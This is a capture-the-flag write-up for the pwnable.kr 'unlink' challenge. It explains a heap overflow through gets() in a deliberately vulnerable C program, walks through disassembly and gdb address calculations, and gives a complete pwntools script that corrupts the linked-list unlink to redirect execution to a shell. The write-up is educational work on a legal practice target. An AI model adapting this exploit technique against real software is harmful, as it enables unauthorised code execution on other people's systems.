## Description
unlink - 10 pt [writeup]

> Daddy! how can I exploit unlink corruption?
>
> ssh unlink@pwnable.kr -p2222 (pw: guest)

## Solution
So we are given a binary file `unlink`, and it's source code `unlink.c`.
At first, let's look at the binary file:
```shell
$ file unlink
unlink: setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=3b89c9c89761e7ff1727d2ed9cf0117d3313a370, not stripped
$ checksec unlink
[*] './unlink'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Now let's take a look at the source code:
### unlink.c
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
typedef struct tagOBJ{
	struct tagOBJ* fd;
	struct tagOBJ* bk;
	char buf[8];
}OBJ;

void shell(){
	system("/bin/sh");
}

void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
int main(int argc, char* argv[]){
	malloc(1024);
	OBJ* A = (OBJ*)malloc(sizeof(OBJ));
	OBJ* B = (OBJ*)malloc(sizeof(OBJ));
	OBJ* C = (OBJ*)malloc(sizeof(OBJ));

	// double linked list: A <-> B <-> C
	A->fd = B;
	B->bk = A;
	B->fd = C;
	C->bk = B;

	printf("here is stack address leak: %p\n", &A);
	printf("here is heap address leak: %p\n", A);
	printf("now that you have leaks, get shell!\n");
	// heap overflow!
	gets(A->buf);

	// exploit this unlink!
	unlink(B);
	return 0;
}
```

As we can see, the program is allocating 3 objects on the heap, and then it creates a double linked.\
It prints the address of the pointer to the first object on the stack, and the address of the first object on the heap.\
Then the `gets` function is called on the buffer of the first object, which means we have a heap overflow.
And we are clearly told to exploit the `unlink` function using the heap overflow.

Let's take a look at the `unlink` function. Which should be familier to the `unlink` function from the `glibc` library.\
It's purpose is to remove an object from a double linked list.\
Just like the `glibc` function, it takes a pointer to the object to remove, and it removes it from the list by changing the pointers of the objects before and after it.\
The function is implemented as follows:
```c
void unlink(OBJ* P){
	OBJ* BK;
	OBJ* FD;
	BK=P->bk;
	FD=P->fd;
	FD->bk=BK;
	BK->fd=FD;
}
```

So let's look at the code of `unlink()` in the context of `unlink(B);`.

`BK` is pointing to `A`, and `FD` is pointing to `C`.\
Then `FD->bk=BK`, is executed, meaning `BK` is moved to `FD`.\
After that, `BK->fd=FD` is executed, meaning `FD` is moved to `BK+4`.

So to conclude, here is a simplified version of `unlink`:
```c
unlink(B):
    BK = B+4
    FD = B
    *(FD+4) = BK
    *(BK) = FD
```

Ok so now we know how the `unlink` function works, let's try to exploit it.\
We control the content of the buffer of A, but we have an overflow, so we also control the content of B.\
Meaning we can control the content of `BK` and `FD`.\
So how can we use this to get a shell?

We somehow need to hijack the execution and get it to run the `shell()` function.\

Lets look at the disassembly of main:
```shell
   ....
   0x080485e4 <+181>:	call   0x8048390 <gets@plt>
   0x080485e9 <+186>:	add    esp,0x10
   0x080485ec <+189>:	sub    esp,0xc
   0x080485ef <+192>:	push   DWORD PTR [ebp-0xc]
   0x080485f2 <+195>:	call   0x8048504 <unlink>
   0x080485f7 <+200>:	add    esp,0x10
   0x080485fa <+203>:	mov    eax,0x0
   0x080485ff <+208>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048602 <+211>:	leave  
   0x08048603 <+212>:	lea    esp,[ecx-0x4]
   0x08048606 <+215>:	ret    
```

We can see right at the end some interesting dereferencing of `%ecx-0x4`.
After the `unlink` function is called, the value stored in `%ebp-0x4` is moved to `%ecx`, then the value stored in `%ecx-0x4` is moved to `%esp`.
And then the `ret` opcode is called, which pops the address stored in `%esp` and saves it to `%eip`. Which means the execution will continue from the address stored in `%esp`.\
So if we change the value of `%ebp-0x4` to point to the heap, where we store a pointer to `shell()`, we can hijack the execution.

Let's explain it more thoroughly.\
We know we can write to `%ebp-0x4`, so we can control the contents of `%ecx`.\
Suppose we have the address of `shell()` stored in the address `AHEAP+8`, lets examine what will happen if we write to `%ebp-0x4` the value `AHEAP+12`.\
`AHEAP+12` is moved to `%ecx`, then the value `AHEAP+12 - 0x4` is moved to `%esp`, which is exactly the value `AHEAP+8`.\
Then the `ret` opcode reads an address from the address stored on `%esp`, which is now `AHEAP+8`, and stores it into `%eip`.\
Which is exactly what we wanted! Now `%eip` has the address of `shell()`.

Now let's do some calculations.\
and keep in mind that we have a stack and a heap leak.\

```shell
$ gdb ./unlink
pwndbg> r
Starting program: unlink 
....
here is stack address leak: 0xff94df74
here is heap address leak: 0x8b005b0
pwndbg> p $ebp-4-0xff94df74
$3 = (void *) 0x10
pwndbg> p shell
$4 = {<text variable, no debug info>} 0x80484eb <shell>
```
So `%ebp-4` is the address of the stack leak + `0x10`.\
Also, The address of `shell()` is `0x80484eb`.\

Now we can finally write our exploit:
```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'i386'
# context.binary = './unlink'

SHELL_ADDR = 0x80484eb

shell = ssh('unlink', 'pwnable.kr', password='guest', port=2222)
p = shell.process('./unlink')

print(a := p.recvuntil(b"\n").decode().strip())
print(b := p.recvuntil(b"\n").decode().strip())
print(p.recvuntil(b"\n").decode().strip())

PTR = int(a.split(':')[1], 16)  # the address of `OBJ* A` on the stack
AHEAP = int(b.split(':')[1], 16)  # the address of `OBJ A` on the heap.

payload = [
	p32(SHELL_ADDR),
	b"A"*12,
	p32(AHEAP+12),  # B.fd
    p32(PTR+0x10),  # B.bk
]
payload = b''.join(payload)
log.info("Sending payload:")
log.info(f"{payload}")

p.send(payload + b'\n')

p.interactive()
```
Yay! We get a shell! 🥳🥳

Notice that on the pwn server, the size of a pointer is 4 bytes, therefore the size of struct `OBJ` is 16 bytes. So the padding needed is 12 bytes.\
That wasn't the case on my local machine which is 64 bit, so I had to change the padding to 20 bytes. Which caused me a lot of trouble at first.

## Setup
```shell
mkdir unlink && scp -P2222 unlink@pwnable.kr:* ./unlink # Download the files from the server
```
